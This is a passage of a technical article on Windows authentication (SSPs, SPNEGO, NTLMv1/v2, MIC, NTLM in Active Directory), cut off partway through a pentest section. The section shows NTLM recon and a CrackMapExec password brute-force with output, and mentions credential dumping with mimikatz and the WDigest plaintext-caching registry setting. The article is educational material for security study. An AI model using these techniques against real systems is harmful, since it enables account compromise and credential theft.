<td><a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/acceptsecuritycontext--general">AcceptSecurityContext</a></td>
<td>gss_accept_sec_context</td>
</tr>
</tbody>
</table>
<figcaption>
SSPI GSS-API functions equivalencies
</figcaption>
</figure>
<div id="outline-container-windows-ssps" class="outline-4">
<h4 id="windows-ssps">
Windows SSPs
</h4>
<div id="outline-text-windows-ssps" class="outline-text-4">
<p>
In Windows there are different SSPs (Security Support Provider), in form of
DLLs, that implement the SSPI and can be used by different applications.
<a href="https://en.wikipedia.org/wiki/Security_Support_Provider_Interface">Some SSPs</a> are the following:</p>
<div id="outline-container-kerberos-ssp" class="outline-5">
<h5 id="kerberos-ssp">
Kerberos SSP
</h5>
<div id="outline-text-kerberos-ssp" class="outline-text-5">
<p>
The <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-kerberos">Kerberos SSP</a> (kerberos.dll) manages the Kerberos authentication. It
also responsible for caching the Kerberos tickets and keys.</p>
</div>
</div>
<div id="outline-container-ntlm-ssp" class="outline-5">
<h5 id="ntlm-ssp">
NTLM SSP
</h5>
<div id="outline-text-ntlm-ssp" class="outline-text-5">
<p>
The <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm">NTLMSSP</a> (msv1_0.dll) manages NTLM authentication. It is responsible for
caching the NT hashes that can be extracted by mimikatz from the lsass process.</p>
</div>
</div>
<div id="outline-container-negotiate-ssp" class="outline-5">
<h5 id="negotiate-ssp">
Negotiate SSP
</h5>
<div id="outline-text-negotiate-ssp" class="outline-text-5">
<p>
The <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-negotiate">Negotiate</a> SSP (secur32.dll) is an intermediary SSP that manages the <a href="#spnego">SPNEGO</a>
negotiation and delegates the authentication to Kerberos SSP or NTLM SSP, based
on the negotiation result.</p>
<figure>
<pre class="example">                                             Kerberos
                                         .-------------------------.
                                         |      kerberos.dll       |
                                         |-------------------------|
                                         .---           .----      |
                   Negotiate       .---&gt; | GSS-API ---&gt; | Kerberos |
                 .-------------.   |     '---           '----      |
                 | secur32.dll |   |     |                         |
                 |-------------|   |     '-------------------------'
 .---------.     .---          |   |
 |  user   |----&gt;| GSS-API ----|&gt;--|
 | program |     '---          |   |         NTLM
 '---------'     |             |   |     .-------------------------.
                 '-------------'   |     |       msv1_0.dll        |
                                   |     |-------------------------|
                                   |     .---           .----      |
                                   '---&gt; | GSS-API ---&gt; | NTLM     |
                                         '---           '----      |
                                         |                         |
                                         '-------------------------'
</pre>
<figcaption>
Program that uses Negotiate (SPNEGO)
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-digest-ssp" class="outline-5">
<h5 id="digest-ssp">
Digest SSP
</h5>
<div id="outline-text-digest-ssp" class="outline-text-5">
<p>
The <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-digest-ssp">Digest</a> (wdigest.dll) implements the Digest Access protocol. Used for HTTP.
This is the SSP that caches the plaintext password in old operating systems that
can be retrieved by mimikatz.</p>
<p>
Even if the password caching is disabled by default since Windows 2008 R2, it is
still possible to enable the password caching by setting the
<code class="verbatim">HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential</code>
registry entry to 1 or <a href="https://blog.xpnsec.com/exploring-mimikatz-part-1/">patching the Digest SSP</a> directly in memory.</p>
</div>
</div>
<div id="outline-container-secure-channel-ssp" class="outline-5">
<h5 id="secure-channel-ssp">
Secure Channel SSP
</h5>
<div id="outline-text-secure-channel-ssp" class="outline-text-5">
<p>
The <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/secure-channel">Secure Channel</a> (schannel.dll) provide encrypted communications. It is used
to add SSL/TLS layer to HTTP communications.</p>
</div>
</div>
<div id="outline-container-cred-ssp" class="outline-5">
<h5 id="cred-ssp">
Cred SSP
</h5>
<div id="outline-text-cred-ssp" class="outline-text-5">
<p>
The <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/credential-security-support-provider">CredSSP</a> (credssp.dll) creates a TLS channel, authenticates the client
through negotiate SSP, and finally allows the client to send the user full
credentials to the server. It is used by <a href="#rdp">RDP</a>.</p>
</div>
</div>
<div id="outline-container-custom-ssps" class="outline-5">
<h5 id="custom-ssps">
Custom SSPs
</h5>
<div id="outline-text-custom-ssps" class="outline-text-5">
<p>
Moreover, also third parties can add its own <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/custom-security-packages">custom SSP</a>, in the registry key
<code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code>. The SSP can also
be an <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/ssp-aps-versus-ssps#sspaps">AP</a> (Authentication Package), that is used by logon applications. Actually,
the registration of an SSP/AP is a technique used by <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a> to <a href="https://www.hackingarticles.in/credential-dumping-security-support-provider-ssp/">steal passwords</a>.</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-spnego" class="outline-3">
<h3 id="spnego">
SPNEGO
</h3>
<div id="outline-text-spnego" class="outline-text-3">
<p>
SPNEGO (Simple and Protected GSS-API Negotiation) is a mechanism that allows to
client-server applications to negotiatite the underlying security protocol, that
is GSS-API compatible, used by the application. This way, both client (also known as
initiator in <a href="https://tools.ietf.org/html/rfc4178">RFC 4178</a>) and server (known as acceptor), can establish the same GSS context
(by calling GSS_Init_sec_context).</p>
<p>
The process for SPNEGO is basically the following:</p>
<ol>
<li>
<p>The client (initiator) calls to <em>GSS_Init_sec_context</em> and indicates that
SPNEGO is going to be used. Then a list with options of security mechanism is
returned (mechTypes) and optionally an initial token for the preferred
mechanism (mechToken). This information is sent to the server (acceptor) in
the message <em>NegTokenInit</em>.</p>
<figure>
<img src="./spnego_negtokeninit.png" alt="./spnego_negtokeninit.png" title="./spnego_negtokeninit.png"><figcaption>
SPNEGO NegTokenInit with Kerberos initial token
</figcaption>
</figure>
</li>
</ol>
<ol>
<li>
<p>The server application passes the initial token and list of security
mechanisms to <em>GSS_Accept_sec_context</em>. Then one of the following
results is returned and sent in a <em>NegTokenResp</em> message (<em>NegTokenResp</em>
is the same that <em>NegTokenTarg</em> shown by Wireshark):</p>
<ol>
<li>None of the security mechanisms is accepted. The server rejects the
negotiation.</li>
<li>If the selected security mechanism is the preferred by the client, the
received token is used. A negotiation token containing an
<em>accept-complete</em> state is created.</li>
<li>Other mechanism than the preferred mechanism is selected, therefore a
negotiation token with <em>accept-incompleted</em> or <em>request-mic</em> state is
created.</li>
</ol>
<figure>
<img src="./spnego_negtokentarg.png" alt="./spnego_negtokentarg.png" title="./spnego_negtokentarg.png"><figcaption>
SPNEGO NegTokenResp with accept-complete response
</figcaption>
</figure>
</li>
<li>If the negotiation is returned to the client, then this passes it to
<em>GSS_Init_sec_context</em> and analyzes it. The negotiation continues until both
client and server agree in a security mechanism and options. </li>
</ol>
<figure>
<pre class="example">                                     Client              Server
                                        |                 |
 GSS_Init_sec_context(SPNEGO=True) &lt;--- |                 |
                                   ---&gt; |   NegTokenInit  |
                            1) Kerberos | --------------&gt; |  
                               (Token)  |    Security?    |  
                            2) NTLM     |    1) Kerberos  |
                                        |       (Token)   |
                                        |    2) NTLM      | Kerberos (Token)
                                        |                 | ---&gt; GSS_Accept_sec_context()
                                        |   NegTokenResp  | &lt;---
                                        | &lt;-------------- | (Token)
                                        |     (Token)     | accept-complete
                                  Token | accept-complete |
            GSS_Init_sec_context() &lt;--- |                 | 
                                        |                 |
                                        |                 |
</pre>
<figcaption>
SPNEGO negotiation
</figcaption>
</figure>
<p>
Windows uses SPNEGO through the <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-negotiate">Negotiate SSP</a>. This allows services like SMB to
use Kerberos or NTLM authentication. Kerberos is mainly used to authenticate
domain users whereas NTLM allows to 
authenticate local computer users. Usually, there is a third option called
<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-negoex">NEGOEX</a>, that allows to amplify the SPNEGO options, but I never seem this option
being used.</p>
<p>
Actually, Windows uses an extension for SPNEGO, <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-spng/f377a379-c24f-4a0f-a3eb-0d835389e28a">SPNG</a>. This extension includes
improvements to SPNEGO, like a new message called <em>NegTokenInit2</em> that allows
the server to init the SPNEGO negotiation.</p>
<figure>
<img src="./spnego_negtokeninit2.png" alt="./spnego_negtokeninit2.png" title="./spnego_negtokeninit2.png"><figcaption>
SPNEGO negotiation
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-ntlm" class="outline-3">
<h3 id="ntlm">
NTLM
</h3>
<div id="outline-text-ntlm" class="outline-text-3">
<div id="outline-container-ntlm-basics" class="outline-4">
<h4 id="ntlm-basics">
NTLM Basics
</h4>
<div id="outline-text-ntlm-basics" class="outline-text-4">
<p>
<a href="http://davenport.sourceforge.net/ntlm.html">NTLM</a> (NT LAN Manager) is an authentication protocol that can be used by Windows
services in order to verify the identity of the client. NTLM is implemented in
the <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm">NTLM SSP</a>, and apart from authentication, it also allows to protect the
communication by signing and/or encrypting the messages.</p>
<p>
Before discuss about NTLM, there are some concepts that it is important to not
confuse:</p>
<ul>
<li><strong>NTLM</strong>: The network protocol used to authenticate users in remote machines. It
is also known as Net-NTLM. </li>
<li><strong>NTLMv1</strong>: The version 1 of NTLM. It is also known as Net-NTLMv1.</li>
<li><strong>NTLMv2</strong>: The version 2 of NTLM, it differs from NTLMv1 in the way the session
key and NTLM hash is calculated. It is also known as Net-NTLMv2.</li>
<li><strong>NTLM2</strong>: Is the NTLMv1 with enhanced security, but still weaker than NTLMv2.</li>
<li><strong>NTLM hash/response</strong>: The response to the server challenge, calculated from
the NT hash. It is also known as Net-NTLM hash and NTLM response.</li>
<li><strong>NTLMv1 hash</strong>: The NTLM hash created by NTLMv1.</li>
<li><strong>NTLMv2 hash</strong>: The NTLM hash created by NTLMv2.</li>
<li><a href="#lm-nt-hashes">NT hash</a> : A hash derivated from the user password, used as secret for the
NTLM authentication. It is usually called the NTLM hash, but this name is not
correct, since the NTLM hash is the one produced by the NTLM protocol.</li>
<li><a href="https://en.wikipedia.org/wiki/LAN_Manager#LM_hash_details">LM hash</a>: The older LAN Manager hash derived from user password, is obsolete
and not widely used. Pretty easy to crack.</li>
<li><strong>LM Response</strong>: The LM response to the server challenge, by using the LM hash
to calculate it. In can be used in conjuction with the NTLM response. This
response is obsolete.</li>
<li><strong>LMv1</strong>: The version 1 of the LM Response.</li>
<li><strong>LMv2</strong>: The version 2 of the LM Response.</li>
</ul>
<p>The first thing to know is that NTLM is not an isolated protocol that generates
network traffic, but must be used embebed in an application protocol, such as
<a href="#smb">SMB</a>, <a href="#ldap">LDAP</a> or <a href="#http">HTTP</a>.</p>
<p>
Moreover, NTLM can be used in both Active Directory and Workgroups networks. In
Active Directory, for domain users, the preferred authentication protocol is
Kerberos, but NTLM can be used, whereas computer local users can only be
authenticated remotely with NTLM. Therefore, even if <a href="http://woshub.com/disable-ntlm-authentication-windows/">it is possible to disable
NTLM in a domain</a>, is <a href="https://syfuhs.net/killing-ntlm-is-hard">still present in most networks</a> nowadays.</p>
<p>
The NTLM authentication is composed by 3 messages/phases: NEGOTIATE, CHALLENGE
and AUTHENTICATE.</p>
<figure>
<pre class="example">client               server
  |                    |
  |                    |
  |     NEGOTIATE      |
  | -----------------&gt; |
  |                    |
  |     CHALLENGE      |
  | &lt;----------------- |
  |                    |
  |    AUTHENTICATE    |
  | -----------------&gt; |
  |                    |
  |    application     |
  |      messages      |
  | -----------------&gt; |
  | &lt;----------------- |
  | -----------------&gt; |
  |                    |
</pre>
<figcaption>
NTLM authentication
</figcaption>
</figure>
<ol>
<li>
<p>Firstly, the client, after initiating the security context, by calling
<code>InitializeSecurityContext</code> of the NTLM SSP, sends a NEGOTIATE message to the
server. It indicates security options, like the NTLM version to use.</p>
<figure>
<img src="./ntlm_negotiate.png" alt="./ntlm_negotiate.png" title="./ntlm_negotiate.png"><figcaption>
NTLM negotiate message
</figcaption>
</figure>
</li>
<li>
<p>The server generates a challenge by calling <code>AcceptSecurityContext</code> of
the NTLM SSP, and sends it to the client within a CHALLENGE message. Also
confirms the negotiated options and sends information about its computer name
and version and domain name.</p>
<figure>
<img src="./ntlm_challenge.png" alt="./ntlm_challenge.png" title="./ntlm_challenge.png"><figcaption>
NTLM challenge message
</figcaption>
</figure>
</li>
<li>
<p>The client receives the challenge and pases it to <code>InitializeSecurityContext</code>
in order to calculate a response by using the client key (NT hash). If it is
required, it also creates a session key and encrypts it with a key, known as
session base key, derivated from NT hash. The client sends the response and
session key back to the server. Also sends <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/83f5e789-660d-4781-8491-5f8c6641f75e">different attributes</a> known as
av_pairs, like information about its computer name and version and domain
name and the negotiate flags. Moreover, the message includes a MIC (Message
Integrity Code) to avoid tampering.</p>
<figure>
<img src="./ntlm_authenticate.png" alt="./ntlm_authenticate.png" title="./ntlm_authenticate.png"><figcaption>
NTLM authenticate message
</figcaption>
</figure>
</li>
<li>
<p>Finally, the server verifies that the challenge response is correct
(<code>AcceptSecurityContext</code>) and a security session/context is setup. Following
messages will be encrypted/signed with the session key.</p>
<figure>
<img src="./spnego_negtokentarg.png" alt="./spnego_negtokentarg.png" title="./spnego_negtokentarg.png"><figcaption>
Authentication completed
</figcaption>
</figure>
</li>
</ol>
<figure>
<pre class="example">                         client               server
                           |                    |
 AcquireCredentialsHandle  |                    |
           |               |                    |
           v               |                    |
 InitializeSecurityContext |                    |
           |               |     NEGOTIATE      |
           '-------------&gt; | -----------------&gt; | ----------.
                           |     - flags        |           |
                           |                    |           v
                           |                    | AcceptSecurityContext
                           |                    |           |
                           |                    |       challenge
                           |     CHALLENGE      |           |
           .-------------- | &lt;----------------- | &lt;---------'
           |               |   - flags          |
       challenge           |   - challenge      |
           |               |   - server info    |
           v               |                    |
 InitializeSecurityContext |                    |
       |       |           |                    |
    session  response      |                    |
      key      |           |    AUTHENTICATE    |
       '-------'---------&gt; | -----------------&gt; | ------.--------.
                           |   - response       |       |        |
                           |   - session key    |       |        |
                           |     (encrypted)    |   response  session
                           |   - attributes     |       |       key
                           |     + client info  |       |        |
                           |     + flags        |       v        v
                           |   - MIC            | AcceptSecurityContext
                           |                    |           |
                           |                    |           v
                           |                    |           OK
                           |                    |
</pre>
<figcaption>
NTLM authentication process
</figcaption>
</figure>
<p>
The NTLM authentication process is handled by the <a href="#ntlm-ssp">NTLM SSP</a>, independently of the
application protocol that uses it. Also, it must be notice that in order to
proof its identity the client must have a key. The key used in NTLM
authentication is the <a href="#lm-nt-hashes">NT hash</a> of the user that acts as client (also LM hash is
used in NTLMv1).</p>
<p>
Nevertheless, in NTLM, the NT hash is not transmitted over the network, but is
only used to calculate the NTLM response to the server challenge and the session
key. The NTLM response is also known as the NTLM hash (also called Net-NTLM
hash). The calculation of the NTLM hash depends on the version of the NTLM
protocol.</p>
<blockquote>
<p>When NTLM is used, the credentials are not transmitted over the network, so they
are not cached in the target machine. Therefore, they cannot be retrieved with
<a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>.</p>
</blockquote>
<p>
Currently there are 2 versions of the NTLM protocol: <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/464551a8-9fc4-428e-b3d3-bc5bfb2e73a5">NTLMv1</a> and <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3">NTLMv2</a>. The
version to being used <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3">is not negotiated in the transmission</a> but <a href="http://woshub.com/disable-ntlm-authentication-windows/">must be
configured properly in client and server</a>.</p>
<p>
However, in the NTLM messages other security parameters are <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/99d90ff4-957f-4c8a-80e4-5bfe5a9a9832">negotiated</a> like:</p>
<ul>
<li>Session signing. Useful to prevent <a href="#ntlm-relay">NTLM Relay</a> attacks</li>
<li>Session sealing\encryption. Not commonly used.</li>
<li>Generate LM response. In case LM response is not required, it will not be
processed by the server.</li>
<li>Use of NTLMv2 or NTLMv1 session security. The session security is not the
authentication version, but an extension to improve the security of NTLMv1
authentication.</li>
</ul>
<p>Let's see the differences between NTLMv1 and NTLMv2.</p>
<div id="outline-container-ntlmv1" class="outline-5">
<h5 id="ntlmv1">
NTLMv1
</h5>
<div id="outline-text-ntlmv1" class="outline-text-5">
<p>
In <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/464551a8-9fc4-428e-b3d3-bc5bfb2e73a5">NTLMv1</a>, the NTLM response (NTLMv1 hash) to the server challenge is calculated
by using the NT hash to encrypt the server challenge with the DES algorithm. The
session key is also encrypted with the NT hash directly.</p>
<blockquote>
<p>NTLMv1 can be used with NTLMv2 Session Security, that is not NTLMv2, but an
extension to enhance security of NTLMv1.</p>
</blockquote>
<figure>
<pre class="example">                    Server                  Client
                   challenge               challenge
                       |           (if NTLMv2 Session Security)
                       |                       |
                       '-----------.-----------'
                                   |
                                   v
             .---&gt; LM hash --&gt;
Password ----|                   NTLMv1
             '---&gt; NT hash --&gt;         
                                   v
                                   |
                   .---------------|----------------.
                   |               |                |
                   v               v                v
             NTv1 Response   LMv1 Response    Session Base Key
             (NTLMv1 Hash)   (LMv1 Hash)
</pre>
<figcaption>
NTLMv1 Authentication
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-ntlmv2" class="outline-5">
<h5 id="ntlmv2">
NTLMv2
</h5>
<div id="outline-text-ntlmv2" class="outline-text-5">
<p>
However, in <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3">NTLMv2</a> more data is taken into to protect the integrity
of the AUTHENTICATE message, and therefore, the integrity of the hole
session. To calculate the response (NTLM hash), NTLMv2 takes into account:</p>
<ul>
<li>The server challenge</li>
<li>A random generated client challenge</li>
<li>The current timestamp</li>
<li>The <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/83f5e789-660d-4781-8491-5f8c6641f75e">AvPairs</a> field that contains information like server domain/hostname or if
the Mic is included in the message (MsvAvFlags). (In the docs the AvPairs is
documented as the confusing <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3">ServerName field</a>) </li>
</ul>
<figure>
<pre class="example">                                                          .---
                                                          | - Domain
           Server       Client      Timestamp    AvPairs &lt;  - Dns 
          challenge    challenge        |           |     | - IsMicPresent?
              |            |            |           |     | - Etc...
              |            |            |           |     '---
              '------------'-----.------'-----------'                         
                                 |
                                 v                                          

  Password ---&gt; NT hash ----&gt;  NTLMv2

                                 |
                                 |
                 .---------------|----------------.
                 |               |                |
                 v               v                v
           NTv2 Response   LMv2 Response    Session Base Key
           (NTLMv2 Hash)   (LMv2 Hash)
</pre>
<figcaption>
NTLMv2 Authentication
</figcaption>
</figure>
<p>
NTLMv2 concatenates all this data and applies an HMAC to calculate the
NTLM response, known as NTLMv2 hash. Furthermore, this data is also used to calculate
the session key.</p>
</div>
</div>
<div id="outline-container-mic" class="outline-5">
<h5 id="mic">
MIC
</h5>
<div id="outline-text-mic" class="outline-text-5">
<p>
Additionally, to protect the integrity of the hole NTLM negotiation, the
AUTHENTICATE message includes a MIC. The <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/f9e6fbc4-a953-4f24-b229-ccdcc213b9ec">MIC is calculated</a> by applying an HMAC
over all the messages of the NTLM process with the session key.</p>
<figure>
<pre class="example">           NEGOTIATE        CHALLENGE        AUTHENTICATE
               |                |                 |
               '----------------'-----------------'
                                |
                                v
                                
 Exported Session Key ----&gt;  HMAC-MD5

                                |
                                v
                               MIC
</pre>
<figcaption>
MIC calculation
</figcaption>
</figure>
<p>
Hence, the integrity of the 3 messages is preserved. And, in case of the
attacker removes the MIC, the authentication will fail, since the NTLMv2
response protects the flag that indicates that MIC is present. Nevertheless, in
the past, the MIC has been the target of various investigations that discovered
the <a href="https://www.preempt.com/blog/cve-2019-1040-windows-vulnerability/"><em>Drop the MIC</em></a> and <a href="https://www.preempt.com/blog/active-directory-ntlm-attacks/"><em>Drop the MIC 2</em></a> vulnerabilities.</p>
<p>
It must be noted, that NTLMv1 doesn't take into account the NTLM flags to create
the response. Therefore, in case of using NTLMv1, an attacker performing a
<a href="#ntlm-relay">NTLM Relay</a> attack can just remove the MIC (and adjust the flags shown in
<a href="https://www.preempt.com/blog/cve-2019-1040-windows-vulnerability/"><em>Drop the MIC</em></a>) of the AUTHENTICATE message to tamper the data and, for
instance, disabling the signing of application messages.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-ntlm-in-active-directory" class="outline-4">
<h4 id="ntlm-in-active-directory">
NTLM in Active Directory
</h4>
<div id="outline-text-ntlm-in-active-directory" class="outline-text-4">
<p>
NTLM can be used both in Workgroups and in Active Directory. In this last case,
it allows to authenticate domain accounts in the machines of the network.
However, the NT hash is stored in the Active Directory <a href="#database">database</a>, located in the
<a href="#domain-controllers">Domain Controllers</a>.</p>
<p>
Therefore, in order to verify the AUTHENTICATE message for a domain account, the
target machine will send a Netlogon (<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/d17f1077-de4b-4fcd-8867-39068cb789f5">NetrLogonSamLogonWithFlags</a>) request to the
DC asking it to verify the client response to the challenge. The DC verifies
this response and returns the necessary information to the machine, such as the
session key and user privileges, in order to continue with the application
session.</p>
<figure>
<pre class="example">  client            server                          DC
    |                 |                              |
    |                 |                              |
    |    NEGOTIATE    |                              |
    | --------------&gt; |                              |
    |                 |                              |
    |    CHALLENGE    |                              |
    | &lt;-------------- |                              |
    |                 |                              |
    |   AUTHENTICATE  |  NetrLogonSamLogonWithFlags  |
    | --------------&gt; | ---------------------------&gt; |
    |                 |                              |
    |                 |        ValidationInfo        |
    |                 | &lt;--------------------------- |
    |                 |                              |
    |   application   |                              |
    |    messages     |                              |
    | --------------&gt; |                              |
    |                 |                              |
    | &lt;-------------- |                              |
    |                 |                              |
    | --------------&gt; |                              |
    |                 |                              |
</pre>
<figcaption>
NTLM process with domain accounts
</figcaption>
</figure>
<p>
Moreover, NTLM can also be used for machines in different domains. In case the
account used is from a different domain that the server, it must ask to the DC
to verify the AUTHENTICATE message, and the DC in turn must send the
AUTHENTICATE message to the DC of the user account domain (by using a <a href="#trusts">trust</a>) in
order to verify it. </p>
<figure>
<pre class="example">  client            server                          DC                      DC
 (it.foo.com)     (foo.com)                      (foo.com)         (it.foo.com)
    |                 |                              |                       |
    |                 |                              |                       |
    |    NEGOTIATE    |                              |                       |
    | --------------&gt; |                              |                       |
    |                 |                              |                       |
    |    CHALLENGE    |                              |                       |
    | &lt;-------------- |                              |                       |
    |                 |                              |                       |
    |   AUTHENTICATE  |  NetrLogonSamLogonWithFlags  |  NetrLogonSamLogonEx  |
    | --------------&gt; | ---------------------------&gt; | --------------------&gt; |
    |                 |                              |                       |
    |                 |      ValidationInfo          |    ValidationInfo     |
    |                 | &lt;--------------------------- | &lt;-------------------- |
    |                 |                              |                       |
    |   application   |                              |                       |
    |    messages     |                              |                       |
    | --------------&gt; |                              |                       |
    |                 |                              |                       |
    | &lt;-------------- |                              |                       |
    |                 |                              |                       |
    | --------------&gt; |                              |                       |
    |                 |                              |                       |
</pre>
<figcaption>
Inter-domain NTLM process
</figcaption>
</figure>
<p>
This way, NTLM can be used in a Active Directory, even if usually Kerberos is
used instead since it is the default option in this environment.</p>
<p>
A trick to force NTLM authentication rather than Kerberos (in Windows built-in
utilities) is to connect to the target machine by specifying the IP address
instead of the hostname, since Kerberos requires the hostname to identify the
machine services.</p>
<p>
For example the command <code>dir \\dc01\C$</code> will use Kerberos to authenticate
against the remote <a href="#shares">share</a> while <code>dir \\192.168.100.2\C$</code> will use NTLM.</p>
</div>
</div>
<div id="outline-container-ntlm-attacks" class="outline-4">
<h4 id="ntlm-attacks">
NTLM Attacks
</h4>
<div id="outline-text-ntlm-attacks" class="outline-text-4">
<p>
Now that we know how NTLM works, let's talk about how it can be used in a
pentest.</p>
<div id="outline-container-ntlm-recon" class="outline-5">
<h5 id="ntlm-recon">
NTLM Recon
</h5>
<div id="outline-text-ntlm-recon" class="outline-text-5">
<p>
NTLM can be useful for reconnaissance, since if the
<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/99d90ff4-957f-4c8a-80e4-5bfe5a9a9832">NTLMSSP_NEGOTIATE_TARGET_INFO</a> flag is sent in the NEGOTIATE message, then the
server will return the TargetInfo field populated with <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/83f5e789-660d-4781-8491-5f8c6641f75e">AvPairs</a> in the CHALLENGE
message, that contain several information related to the server like its
hostname and domain name.</p>
<figure>
<img src="./ntlm_recon_wireshark.png" alt="./ntlm_recon_wireshark.png" title="./ntlm_recon_wireshark.png"><figcaption>
Server information in NTLM CHALLENGE message
</figcaption>
</figure>
<p>
This information can be useful to identify the machine when we only know its IP
and a NTLM-friendly service like SMB or HTTP is available on the server. This
can be used to perform reserve name resolution in networks.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ ntlm-info smb 192.168.100.0/24
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: 192.168.100.7
</span></span><span style="display:flex;"><span>NbComputer: WS02-7
</span></span><span style="display:flex;"><span>NbDomain: CONTOSO
</span></span><span style="display:flex;"><span>DnsComputer: ws02-7.contoso.local
</span></span><span style="display:flex;"><span>DnsDomain: contoso.local
</span></span><span style="display:flex;"><span>Version: 6.1.7601
</span></span><span style="display:flex;"><span>OS: Windows 7 | Windows Server 2008 R2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: 192.168.100.10
</span></span><span style="display:flex;"><span>NbComputer: WS01-10
</span></span><span style="display:flex;"><span>NbDomain: CONTOSO
</span></span><span style="display:flex;"><span>DnsComputer: ws01-10.contoso.local
</span></span><span style="display:flex;"><span>DnsDomain: contoso.local
</span></span><span style="display:flex;"><span>DnsTree: contoso.local
</span></span><span style="display:flex;"><span>Version: 10.0.19041
</span></span><span style="display:flex;"><span>OS: Windows 10 | Windows Server 2019 | Windows Server 2016</span></span></code></pre></div>
</div>
<figcaption>
SMB scan
</figcaption>
</figure>
<p>
It can be used in an internal network, but also from the internet, since some
HTTP servers support NTLM, such as <a href="https://support.microsoft.com/en-us/office/getting-started-in-outlook-web-app-0062c7be-f8e3-486e-8b14-5c1f793ceefd?ui=en-US&amp;rs=en-US&amp;ad=US">Outlook Web App</a>.</p>
<p>
In case of internet this could reveal the name of the internal domain of an
organization, that can be useful to know in order to search for keys or password
leaks in github or to use it for bruteforcing attacks in VPN gateways panels. </p>
<p>
In order to retrieve NTLM information, you can use tools like <a href="https://github.com/pwnfoo/NTLMRecon">NTLMRecon</a> (can
perform HTTP paths bruteforcing) or <a href="https://gitlab.com/Zer1t0/ntlm-info">ntlm-info</a> (supports HTTP and SMB). You
can also identify web endpoints that support NTLM with <a href="https://gitlab.com/Zer1t0/barrido/-/blob/master/wordlists/ntlm.txt">the following wordlist</a>.</p>
</div>
</div>
<div id="outline-container-ntlm-brute-force" class="outline-5">
<h5 id="ntlm-brute-force">
NTLM brute-force
</h5>
<div id="outline-text-ntlm-brute-force" class="outline-text-5">
<p>
Since NTLM is an authentication protocol, it can be use to test the user
credentials or to launch a bruteforcing attack, by using any application
protocol that supports. Usually <a href="#smb-shares">SMB</a> is used, since it is available in Windows
machines, but others like <a href="#sql-server">MSSQL</a> or <a href="#http">HTTP</a> could be used.</p>
<p>
A bruteforce attack with NTLM can be launch with tools like <a href="https://github.com/vanhauser-thc/thc-hydra">hydra</a>, <a href="https://nmap.org/nsedoc/scripts/smb-brute.html">nmap</a>, <a href="https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference#using-usernamepassword-lists">cme</a>, or
<a href="https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1">Invoke-Bruteforce.ps1</a>.  </p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ cme smb 192.168.100.10 -u anakin -p passwords.txt 
</span></span><span style="display:flex;"><span>SMB         192.168.100.10  445    WS01-10          [*] Windows 10.0 Build 19041 x64 (name:WS01-10) (domain:contoso.local) (signing:False) (SMBv1:False)
</span></span><span style="display:flex;"><span>SMB         192.168.100.10  445    WS01-10          [-] contoso.local\anakin:1234 STATUS_LOGON_FAILURE 
</span></span><span style="display:flex;"><span>SMB         192.168.100.10  445    WS01-10          [-] contoso.local\anakin:Vader! STATUS_LOGON_FAILURE 
</span></span><span style="display:flex;"><span>SMB         192.168.100.10  445    WS01-10          [+] contoso.local\anakin:Vader1234! (Pwn3d!)</span></span></code></pre></div>
</div>
<figcaption>
Example of NTLM bruteforce attack using cme
</figcaption>
</figure>
<p>
Nevertheless, you should be careful, since testing too much passwords for a
single account can block it. In this case the SMB response to the AUTHENTICATE
message will contain the code STATUS_ACCOUNT_LOCKED_OUT.</p>
<p>
Moreover, launching bruteforce attacks generates a lot of network traffic,
specially for Active Directory accounts, since the target machine needs to 
